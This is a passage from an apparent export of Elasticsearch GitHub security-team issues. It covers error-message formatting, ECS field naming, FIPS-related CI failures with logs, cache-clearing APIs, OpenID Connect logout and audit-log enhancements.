Without Security enabled, the error message contains the index name surrounded by square brackets and the `index` element of the IndexNotFoundException class is correctly set to `inexistent` (`""index"": ""inexistent""`):

```
{
    ""error"": {
        ""root_cause"": [
            {
                ""type"": ""index_not_found_exception"",
                ""reason"": ""no such index [inexistent]"",
                ""resource.type"": ""index_expression"",
                ""resource.id"": ""inexistent"",
                ""index_uuid"": ""_na_"",
                ""index"": ""inexistent""
            }
        ],
        ""type"": ""index_not_found_exception"",
        ""reason"": ""no such index [inexistent]"",
        ""resource.type"": ""index_expression"",
        ""resource.id"": ""inexistent"",
        ""index_uuid"": ""_na_"",
        ""index"": ""inexistent""
    },
    ""status"": 404
}
```

With Security enabled the error message is slightly different and the index name is a string representation of an array of values, as generated by `java.util.Arrays.toString` method:

```
{
    ""error"": {
        ""root_cause"": [
            {
                ""type"": ""index_not_found_exception"",
                ""reason"": ""no such index [[inexistent]]"",
                ""index_uuid"": ""_na_"",
                ""index"": ""[inexistent]""
            }
        ],
        ""type"": ""index_not_found_exception"",
        ""reason"": ""no such index [[inexistent]]"",
        ""index_uuid"": ""_na_"",
        ""index"": ""[inexistent]""
    },
    ""status"": 404
}
```

Digging a bit around, `IndicesAndAliasesResolver:171` throws an `IndexNotFoundException` with an index value of `Arrays.toString(indicesRequest.indices())` which explains the additional square brackets in the index name (`""index"": ""[inexistent]""`).","Pinging @elastic/es-security (:Security/Security)",no,":Security/Security,Team:Security,"
elastic/elasticsearch,558882889,"Rename `user.username` to `user.name` for SetSecurityUserProcessor","The [SetSecurityUserProcessor](https://www.elastic.co/guide/en/elasticsearch/reference/master/ingest-node-set-security-user-processor.html) auguments ingested documents by adding an user object, where the `username` field does not conform to the recommended naming convention (`name`) described in [ECS](https://www.elastic.co/guide/en/ecs/current/ecs-user.html#_user_field_details). The purpose of this issue is to faciliate discussion on whether we should rename this field. 

PS: there are a few other fields under the user object. They are either confirm to ECS (`email`, `full_name`) or have no definition in ECS, i.e. custom fields (`metadata`, `roles` etc). Both situations are valid per ECS spec.","Pinging @elastic/es-security (:Security/Security)Pinging @elastic/es-core-features (:Core/Features/Ingest)Summary from team discussion:
* ECS is applicable in this case
* Renaming is a breaking change, hence it should be in 8.0 instead of minors.
* We wanna provide a upgrade/deprecation path of 7.x. The suggested approach is to make the name configurable in 7.x. The config option maintains the existing behaviour, but issues deprecation warnings if not configured to conform 8.0 behaviour.
  - GeoIp and userAgent processors used the same approach to deal with similar renaming issues.@albertzaharovits Could you please review my following analysis and proposed solution? I have some new findings which lead to a slightly different approach. Thanks!

The name of the top level field used to store authentication information is configurable. The example in the [doc](https://www.elastic.co/guide/en/elasticsearch/reference/master/ingest-node-set-security-user-processor.html) configures it to be ""user"". However, in theory, this field can be called anything. 

For ESC to be really applicable here, the parent field must be named as ""[user](https://www.elastic.co/guide/en/ecs/current/ecs-user.html)"". If it is not, there is no point to apply ECS to the sub-fields, since ESC's choice of using ""name"" instead of ""username"" is to follow the Avoid repetition [guideline](https://www.elastic.co/guide/en/ecs/current/ecs-guidelines.html). In addition, we could even argue that when the parent field is not `user`, say it is `auth`, it is more desirable for the sub-field to be called `username` instead of `name` for clarity.

Therefore my plan is as follows:
* Keep it possible for this field to be `username` even in 8.0
* ~Add a new boolean option to the processor configuration. If it is true and the parent field is `user`, the username field will be saved as `name`. Otherwise, it is saved as `username`.~ (see changed behaviour below)
* The boolean option defaults to true in 8.0 and false in 7.x (for backwards compatibility and will issue warnings when applicable)
Per Tim's [comment](https://github.com/elastic/elasticsearch/pull/54051#discussion_r396935470), I am tightening the behaviour so that:
If the new compliance option is set, it will also require the field be named as `name`. Otherwise it is a validation error.> The name of the top level field used to store authentication information is configurable. The example in the doc configures it to be ""user"". However, in theory, this field can be called anything.
For ESC to be really applicable here, the parent field must be named as ""user"". If it is not, there is no point to apply ECS to the sub-fields, since ESC's choice of using ""name"" instead of ""username"" is to follow the Avoid repetition guideline. 

In the light of this, maybe we should nest all the user properties under a `user` object field, so the administrator gets to configure `<target_field>.user.name` 

Maybe it's better to continue this discussion under https://github.com/elastic/elasticsearch/pull/54051#pullrequestreview-381086737Pinging @elastic/es-security (Team:Security)Pinging @elastic/es-data-management (Team:Data Management)",no,">enhancement,:Data Management/Ingest Node,:Security/Security,Team:Data Management,Team:Security,v8.6.0,"
elastic/elasticsearch,1247893052,"[CI] Failing cluster start in ':qa:repository-multi-version:v8.3.0#Step2NewClusterTest', maybe FIPS related","### CI Link

https://gradle-enterprise.elastic.co/s/32omqddh3kule

### Repro line

none

### Does it reproduce?

No

### Applicable branches

main

### Failure history

-

### Failure excerpt

```
2022-05-25T10:05:40,491][WARN ][stderr                   ] [yamlRestTestV7CompatTest-0] INFO: Initializing with trust store at path: /dev/shm/elastic+elasticsearch+main+periodic+java-fips-matrix/x-pack/plugin/stack/qa/rest/build/testclusters/yamlRestTestV7CompatTest-0/config/cacerts.bcfks
»   ↑ repeated 4 times ↑
» [2022-05-25T10:05:36,675][ERROR][o.e.x.c.s.SSLService     ] [yamlRestTestV7CompatTest-0] unsupported ciphers [[TLS_AES_256_GCM_SHA384, TLS_AES_128_GCM_SHA256, TLS_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384]] were requested but cannot be used in this JVM, however there are supported ciphers that will be used [[TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384, TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, TLS_RSA_WITH_AES_256_GCM_SHA384, TLS_RSA_WITH_AES_128_GCM_SHA256, TLS_RSA_WITH_AES_256_CBC_SHA256, TLS_RSA_WITH_AES_128_CBC_SHA256, TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA]]. If you are trying to use ciphers with a key length greater than 128 bits on an Oracle JVM, you will need to install the unlimited strength JCE policy files.
» [2022-05-25T10:05:37,615][WARN ][stderr                   ] [yamlRestTestV7CompatTest-0] May 25, 2022 10:05:37 AM org.bouncycastle.jsse.provider.ProvTrustManagerFactorySpi getDefaultTrustStore
» [2022-05-25T10:05:40,491][WARN ][stderr                   ] [yamlRestTestV7CompatTest-0] May 25, 2022 10:05:40 AM org.bouncycastle.jsse.provider.ProvTrustManagerFactorySpi getDefaultTrustStore
```
```
`node{:qa:repository-multi-version:v8.3.0-new-0}` failed to wait for ports files after 120000 MILLISECONDS
```","Pinging @elastic/es-security (Team:Security)I'm marking this as FIPS just because of this line in the logs:
```
» [2022-05-25T10:05:36,675][ERROR][o.e.x.c.s.SSLService     ] [yamlRestTestV7CompatTest-0] unsupported ciphers [[TLS_AES_256_GCM_SHA384, TLS_AES_128_GCM_SHA256, TLS_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256, TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384]] were requested but cannot be used in this JVM, however there are supported ciphers that will be used [[TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384, TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA384, TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA256, TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA, TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA, TLS_RSA_WITH_AES_256_GCM_SHA384, TLS_RSA_WITH_AES_128_GCM_SHA256, TLS_RSA_WITH_AES_256_CBC_SHA256, TLS_RSA_WITH_AES_128_CBC_SHA256, TLS_RSA_WITH_AES_256_CBC_SHA, TLS_RSA_WITH_AES_128_CBC_SHA]]. If you are trying to use ciphers with a key length greater than 128 bits on an Oracle JVM, you will need to install the unlimited strength JCE policy files.
```
I don't know if that is enough to explain the cluster not booting up under 120000ms.I don't think that the logged error is the actual cause. It looks like the node just took longer to start.

```
» [2022-05-25T10:03:37,564][INFO ][o.e.n.Node               ] [yamlRestTestV7CompatTest-0] node name [yamlRestTestV7CompatTest-0], node ID [6ctzuUuKRYqC6USwGww_Rw], cluster name [yamlRestTestV7CompatTest], roles [ingest, data_frozen, ml, data_hot, transform, data_content, data_warm, master, remote_cluster_client, data, data_cold]
» [2022-05-25T10:05:37,689][INFO ][o.e.x.s.Security         ] [yamlRestTestV7CompatTest-0] Security is enabled
» [2022-05-25T10:05:37,968][INFO ][o.e.x.s.a.s.FileRolesStore] [yamlRestTestV7CompatTest-0] parsed [1] roles from file [/dev/shm/elastic+elasticsearch+main+periodic+java-fips-matrix/x-pack/plugin/stack/qa/rest/build/testclusters/yamlRestTestV7CompatTest-0/config/roles.yml]
» [2022-05-25T10:05:39,406][INFO ][o.e.t.n.NettyAllocator   ] [yamlRestTestV7CompatTest-0] creating NettyAllocator with the following configs: [name=unpooled, suggested_max_allocation_size=1mb, factors={es.unsafe.use_unpooled_allocator=null, g1gc_enabled=true, g1gc_region_size=4mb, heap_size=512mb}]
» [2022-05-25T10:05:39,457][INFO ][o.e.i.r.RecoverySettings ] [yamlRestTestV7CompatTest-0] using rate limit [40mb] with [default=40mb, read=0b, write=0b, max=0b]
» [2022-05-25T10:05:39,522][INFO ][o.e.d.DiscoveryModule    ] [yamlRestTestV7CompatTest-0] using discovery type [multi-node] and seed hosts providers [settings, file]
» [2022-05-25T10:05:40.730410371Z] [BUILD] Stopping node
» [2022-05-25T10:05:40,752][INFO ][o.e.n.Node               ] [yamlRestTestV7CompatTest-0] initialized
» [2022-05-25T10:05:40,753][INFO ][o.e.n.Node               ] [yamlRestTestV7CompatTest-0] starting ...
```

There are 2 minutes delay between node info message and security enabled message.

```
[2022-05-25T10:03:37,564][INFO ][o.e.n.Node               ] 
[2022-05-25T10:05:37,689][INFO ][o.e.x.s.Security         ] 
```

The node started immediately after the build initiated stop. 
Looking at the history of failures it does seem that it _mostly_ happens in FIPS mode.
My best guess is that it depends on a number of loaded modules which caused the initialization to sometime take longer.",no,">test-failure,Team:Security,:Security/FIPS,"
elastic/elasticsearch,1242894437,"[CI] OperatorPrivilegesIT suite failing","**Build scan:**
https://gradle-enterprise.elastic.co/s/a2yd3pjyfwexy/tests/:x-pack:plugin:security:qa:operator-privileges-tests:javaRestTest/org.elasticsearch.xpack.security.operator.OperatorPrivilegesIT/testSnapshotRestoreBehaviourOfOperatorSettings

**Reproduction line:**
`./gradlew ':x-pack:plugin:security:qa:operator-privileges-tests:javaRestTest' --tests ""org.elasticsearch.xpack.security.operator.OperatorPrivilegesIT.testSnapshotRestoreBehaviourOfOperatorSettings"" -Dtests.seed=C69385F38E27DE6C -Dtests.locale=de-LU -Dtests.timezone=America/Anguilla -Druntime.java=17 -Dtests.fips.enabled=true`

**Applicable branches:**
7.17

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.security.operator.OperatorPrivilegesIT&tests.test=testSnapshotRestoreBehaviourOfOperatorSettings

**Failure excerpt:**
```
org.elasticsearch.client.ResponseException: method [PUT], host [http://127.0.0.1:37391], URI [/_snapshot/repo], status line [HTTP/1.1 401 Unauthorized]
{""error"":{""root_cause"":[{""type"":""security_exception"",""reason"":""unable to authenticate user [test_admin] for REST request [/_snapshot/repo]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}}],""type"":""security_exception"",""reason"":""unable to authenticate user [test_admin] for REST request [/_snapshot/repo]"",""header"":{""WWW-Authenticate"":""Basic realm=\""security\"" charset=\""UTF-8\""""}},""status"":401}

  at org.elasticsearch.client.RestClient.convertResponse(RestClient.java:346)
  at org.elasticsearch.client.RestClient.performRequest(RestClient.java:312)
  at org.elasticsearch.client.RestClient.performRequest(RestClient.java:318)
  at org.elasticsearch.client.RestClient.performRequest(RestClient.java:287)
  at org.elasticsearch.xpack.security.operator.OperatorPrivilegesIT.createSnapshotRepo(OperatorPrivilegesIT.java:219)
  at org.elasticsearch.xpack.security.operator.OperatorPrivilegesIT.testSnapshotRestoreBehaviourOfOperatorSettings(OperatorPrivilegesIT.java:166)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:77)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:568)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at java.lang.Thread.run(Thread.java:833)

```","Pinging @elastic/es-security (Team:Security)",no,">test-failure,:Security/Security,Team:Security,:Security/FIPS,"
elastic/elasticsearch,668216054,"Docs - clarify file-based role mappings do not support wildcard DN's","[File-based role management](https://www.elastic.co/guide/en/elasticsearch/reference/current/defining-roles.html#roles-management-file) states: 

>  Please note however, that the `roles.yml` file is provided as a minimal administrative function and is not intended to cover and be used to define roles for all use cases.

The role mapping API supports wildcard DN's so it would be helpful to clarify the same should not be expected if file-based role mappings are used. ","Pinging @elastic/es-docs (>docs)Pinging @elastic/es-security (:Security/Authorization)",no,">docs,:Security/Authorization,Team:Docs,Team:Security,"
elastic/elasticsearch,317447824,"Include node information in failed security exceptions","*Original comment by @ppf2:*

Maps to: LINK REDACTED

Our current Shield/Xpack security responses for failed authentication/authorization does not include any node information. Customer would like us to include information on the node that failed authentication/authorization in the response of the request so they can easily tell where to go look for potential configuration issues (certainly more useful for file realm).

```
{\""error\"":{\""root_cause\"":[{\""type\"":\""security_exception\"",\""reason\"":\""unable to authenticate user [logstashUser] for REST request [/_bulk]\"",\""header\"":{\""WWW-Authenticate\"":\""Basic realm=\\\""security\\\"" charset=\\\""UTF-8\\\""\""}}],\""type\"":\""security_exception\"",\""reason\"":\""unable to authenticate user [logstashUser] for REST request [/_bulk]\"",\""header\"":{\""WWW-Authenticate\"":\""Basic realm=\\\""security\\\"" charset=\\\""UTF-8\\\""\""}},\""status\"":401}
```
","*Original comment by @jaymode:*

Shouldn't this be a general thing? Like all exceptions that get emitted should have node information attached as part of the response?*Original comment by @ppf2:*

Yah that will be helpful to have something generic (the file based use case is just one that will be particularly useful for it opens the door to users having file based users/roles that can potentially be out of sync). thx!",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,1208211814,"License service metadata updates don't respect `?master_timeout`","There are various cluster state updates in `LicenseService` triggered by `MasterNodeRequest` derivatives. `MasterNodeRequest#masterNodeTimeout` usually defines the timeout for cluster state update tasks, and this field is mostly populated correctly at the REST layer but it is not passed to the master service so these tasks never time out and will sit in the pending task queue until eventually processed. That can be confusing to clients which hit a client-side timeout before the task completes, since these clients may see their requests taking effect hours (days?) later even after receiving an error response.","Pinging @elastic/es-security (Team:Security)",no,">bug,:Security/License,Team:Security,"
elastic/elasticsearch,940122085,"[DOCS] Stack updates for security ON by default","Security ON by default greatly simplifies security configuration tasks by enabling authentication and authorization by default in the Elastic Stack. This feature requires changes to the documentation for configuring Elasticsearch security, but also for each of the clients (Kibana, Beats, Logstash) that connect to Elasticsearch.

In addition to updating the current documentation, we should integrate security configuration docs for each of the clients into the documentation for [configuring security for the Elastic Stack](https://www.elastic.co/guide/en/elasticsearch/reference/current/configuring-stack-security.html). Consolidating this information into a single location provides a more unified user experience and consistent flow. The documentation for Beats is largely there, but Logstash and Fleet + Agent are still separate.

### Alpha documentation
- [x] [ 4D ] Create documentation for alpha1 #76052
- [x] [ 1W ] Update documentation for alpha2

### Update existing security documentation for the Stack
- [x] [ 2W ] Reconfigure each of the three guides for [configuring security for the Elastic Stack](https://www.elastic.co/guide/en/elasticsearch/reference/current/configuring-stack-security.html)
- [x] [ 1W ] Document the process for starting Elasticsearch, enrolling Kibana, and enrolling additional nodes ([Enroll Kibana API](https://www.elastic.co/guide/en/elasticsearch/reference/master/security-api-kibana-enrollment.html))
- [x] [ 1W ] Update security configuration for Kibana (in Elastic Stack guide) and update any security-related docs in the Kibana documentation
- [ ] [ 1W ] Update documentation for Observability 
- [ ] [ 1W ] Update documentation for Elastic Security
- [ ] [ 2D ] Update documentation for Enterprise Search -- for example, the security settings in this [installation guide](https://www.elastic.co/guide/en/app-search/current/installation.html#installation-self-managed) will no longer need to be set manually. Same for [Workplace Search](https://www.elastic.co/guide/en/workplace-search/current/workplace-search-install.html) and [Enterprise Search](https://www.elastic.co/guide/en/enterprise-search/current/installation.html).

### Update and integrate security documentation for Elastic clients
- [ ] [ 1W ] Update [security documentation for Beats](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-basic-setup-https.html#configure-beats-security)
- [ ] [ 1W ] Update and integrate [security documentation for Logstash](https://www.elastic.co/guide/en/logstash/current/ls-security.html)
- [ ] [ 2D ] Integrate Fleet + Agent docs into the Elastic Stack security docs [#74640]
- [ ] [ 2D ] Create redirects for pages that get integrated into the Elastic Stack security docs

#### New related features
[Enroll Kibana API](https://www.elastic.co/guide/en/elasticsearch/reference/master/security-api-kibana-enrollment.html)
[elasticsearch-create-enrollment-token tool](https://www.elastic.co/guide/en/elasticsearch/reference/master/create-enrollment-token.html)
[elasticsearch-reset-elastic-password tool](https://www.elastic.co/guide/en/elasticsearch/reference/master/reset-elastic-password.html)","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,v8.6.0,"
elastic/elasticsearch,605113838,"reindexing .security before upgrades.","Added a note about reindexing .security during upgrades

<!--
Thank you for your interest in and contributing to Elasticsearch! There
are a few simple things to check before submitting your pull request
that can help with the review process. You should delete these items
from your submission, but they are here to help bring them to your
attention.
-->

- Have you signed the [contributor license agreement](https://www.elastic.co/contributor-agreement)?
- Have you followed the [contributor guidelines](https://github.com/elastic/elasticsearch/blob/master/CONTRIBUTING.md)?
- If submitting code, have you built your formula locally prior to submission with `gradle check`?
- If submitting code, is your pull request against master? Unless there is a good reason otherwise, we prefer pull requests against master and will backport as needed.
- If submitting code, have you checked that your submission is for an [OS and architecture that we support](https://www.elastic.co/support/matrix#show_os)?
- If you are submitting this code for a class then read our [policy](https://github.com/elastic/elasticsearch/blob/master/CONTRIBUTING.md#contributing-as-part-of-a-class) for that.
","Pinging @elastic/es-security (:Security/Authentication)Pinging @elastic/es-docs (>docs)",yes,">docs,>upgrade,:Security/Authentication,Team:Docs,Team:Security,"
elastic/elasticsearch,822912423,"[CI] Use INTEG_TEST distribution in FIPS 140 testing when possible","In https://github.com/elastic/elasticsearch/pull/64024 , we changed our test setup for FIPS 140 to always use the default distribution because we always wanted to set `xpack.security.fips_mode.enabled: true` and we can't do this with INTEG_TEST distribution as in tests for non-xpack modules, that setting is not available. 

We should try to refrain from setting a specific distribution in fips and use INTEG_TEST as much as possible ( to the extent that the test suites themselves already use it). This has two benefits:

- Improves cacheability and allows us to have a smaller footprint for our test clusters
- Most importantly, it allows us to have similar setups for fips and non-fips CI testing, which would alleviate most of the issues highlighted by the flakiness of https://github.com/elastic/elasticsearch/issues/66820

This issue is for tracking the problem so that we can schedule for the appropriate time for investigation and come up with a proposal on how to do this.","Pinging @elastic/es-security (Team:Security)I don't fully understand the conversation in #66820. But is the proposal to just allow extra xpack settings but make them no-op? If so, why don't we just stop running FIPS for these tests at all? Also, FIPS is a bit of a cross-cutting mode. So even if a test does not seem to use it directly, is it possible that they would still fail in FIPS mode? A not-great example is the md5 hasher used for fingerprint ingestion processor. I know md5 is still allowed by BC-FIPS, but assume it is not. If it uses the `INTEG_TEST` distribution, the test will not catch this issue?> But is the proposal to just allow extra xpack settings but make them no-op? If so, why don't we just stop running FIPS for these tests at all?

There is no proposal in this issue. The issue tracks the need to look into using INTEG_TEST distribution as much as we can and the proposal will come from that investigation. For the question you raise, I think  we'd need to not set `xpack.security.fips_mode.enabled` when there are no xpack modules ( as setting it has no effect ). The security provider will still be in use and in fips mode. 

I'm not sure what the argument is with ""using FIPS mode"", are you talking about the security provider? If so, I don't think we'll end up suggesting not using the security provider in FIPS mode. 

Thanks for the clarification. My questions are not well formulated and they are based on my misunderstanding of the conversation in #66820. Please disregard them. No worries Yang, thanks for asking. I think the issue description is not as clear as it should be and the questions are valid, I'll try and rewrite it an clean way",no,"Team:Security,:Security/FIPS,"
elastic/elasticsearch,828515966,"Enhancements for APIs that clear security related caches","We have quite a few cache clearing related APIs for different caches used in security related code:
* [Clear realm cache](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-clear-cache.html)
* [Clear application privileges cache](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-clear-privilege-cache.html)
* [Clear roles cache](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-clear-role-cache.html)
* [Clear API key cache](https://www.elastic.co/guide/en/elasticsearch/reference/current/security-api-clear-api-key-cache.html)

There are a few things we could possibly improve upon for above APIs:
#### Better support for wildcard
Today the APIs only takes a literal `*` and interprets it as match everything. It does not work with arbitrary wildcard strings, e.g. `role-*`, which will only be compared literally and silently skipped if no match is found. This behaviour could be a surprise to our users because wildcard support in many other places are more flexible or at least the prefix form (`role-*`) should be supported. 

Also the current implementation is slightly wrong because many security entities allow using `*` in their names. For example, we can actually create a role named `*`. There is no way to clear cache for this role because a single `*` is interpreted as match all by the clear cache API.

#### More informative responses
The current response from the cache clearing APIs is mostly a barebone [BaseNodesResponse](https://github.com/elastic/elasticsearch/blob/7.11/server/src/main/java/org/elasticsearch/action/support/nodes/BaseNodesResponse.java). It tells you the list of nodes that the request hits and how many nodes successfully responds to it. But it does not tell you exactly what cache entries or how many of them are cleared from each node. For example, if you had a typo in the role name (or simply just because the role is not cached) when issuing a clear role cache call, the response will just report success without any hints that the name does not match anything in the cache. Adding a bit more details about how the request is executed on each node could be helpful here.

#### Cache status check
Technically this is not about cache clearing. But I don't want to create a separate issue just for this and it is somewhat related to clearing because one may want to decide whether to issue clearing call based on the stats. The [request and query caches](https://www.elastic.co/guide/en/elasticsearch/reference/current/cluster-nodes-stats.html) on the search side have detailed stats. We may not need that level of details, but some overall stats like count could be useful.
","Pinging @elastic/es-security (Team:Security)",no,">enhancement,:Security/Security,Team:Security,"
elastic/elasticsearch,440642236,"REST endpoint xpack.ssl.certificates should be renamed","The [`xpack.ssl.certificates`](https://github.com/elastic/elasticsearch/blob/master/x-pack/plugin/src/test/resources/rest-api-spec/api/ssl.certificates.json) REST endpoint in the REST spec should be renamed to `xpack.security.ssl_certificates`, as `ssl` is not a namespace we have or need.

/cc @elastic/es-clients ","Pinging @elastic/es-securityThe rename could potentially go in in 7.x where we make `ssl.certificates` deprecated as per #39063
and copy the spec to `security.ssl_certificates`.

A hard rename on 6.x from `xpack.ssl.certificates` to `xpack.security.ssl_certificates` on 6.x would be breaking.

Assuming you meant on 7.x since that's the one you linked but calling it out explicitly nonetheless :smile:",no,":Security/Security,Team:Security,"
elastic/elasticsearch,540994399,"New endpoint to get the ssl/certificate details from all nodes with one query","
Currently there exists the endpoint `/_ssl/certificates` which provides the certificate details, BUT ... only for the node to which you are connected.  Getting these details for a full cluster can be difficult or impossible (if not all nodes are available from the point you are connecting).

Proposal:

A new endpoint e.g. `/_nodes/ssl/certificates` which would do a federated query and return the certificate details of all nodes 

","Pinging @elastic/es-security (:Security/Network)",no,":Security/TLS,Team:Security,"
elastic/elasticsearch,554787985,"Support OP initiated logout in our OpenID Connect realm","Our OpenID Connect realm supports RP initiated Single Logout as defined in the [session management](https://openid.net/specs/openid-connect-session-1_0.html#RPLogout) specification. While it would be problematic to support OP initiated SLO as defined in there ( with the use of iframes in Kibana or with [backchannel communication](http://openid.net/specs/openid-connect-backchannel-1_0.html) ) , it might be useful to support [Front Channel OP initiated SLO](https://openid.net/specs/openid-connect-frontchannel-1_0.html#OPLogout)

The current state is that front channel OP initiated SLO ""works"" but doesn't support the optional `sid` and `iss` parameters that are specified in the spec. For the time being we could also document this","Pinging @elastic/es-security (:Security/Authentication)I was just wondering why Backchannel logout is not supported in Kibana. Can we not add a backchannel logout endpoint in Kibana ?

Thanks,
Paurav.",no,">enhancement,:Security/Authentication,Team:Security,"
elastic/elasticsearch,403762226,"Audit security configuration changes","Add audit event types that describe changes to the security configurations:

* Adding/Deleting/Changing users/roles/role mappings
* TLS certs reloaded
* Realms configuration changes

Related: https://github.com/elastic/elasticsearch/issues/29766","Pinging @elastic/es-securityIt's astonishing that these capabilities are currently missing! 

Quoting the Elastic website: ""Audit Logging: Have a Record of Who Did What and When. Perhaps the quiet hero of the security world, our audit log features let you easily maintain a complete record of all system and user activity.""

What good is an auditing system which does not record the actual object that is changed? We know ""Who"" and ""When"" but not ""What"". ",no,">enhancement,:Security/Audit,Team:Security,"
elastic/elasticsearch,317454101,"Shield Audit Log to optionally include Roles of a user","*Original comment by @skearns64:*

The Shield Audit Log should optionally include the roles of the user. For auditing purposes, some users want to know what role(s) a user had at the time they were making a given request. 

In some cases, it may be desirable to show _only_ the roles that contain privileges that grant access to the resources used in the request, though this seems like a nice-to-have - there is significant value to recording roles even without this features.

Another use-case for this feature is tracking how groups (identified by their roles) are using the application/cluster


","*Original comment by @albertzaharovits:*

This was merged in LINK REDACTED .
It adds all the roles the user has (irrespective of the action).

From the look of things, the role names that have permissions to grant the specific action should be relatively easy to get. In this case all roles concerning the requested indices/actions and access level will be audited.

I think this nice-to-have part of the feature should have it's own audit event field; in other words I think we should keep the field with all the roles the user has.

WDYT @skearns64 and @jaymode ?

*Original comment by @jaymode:*

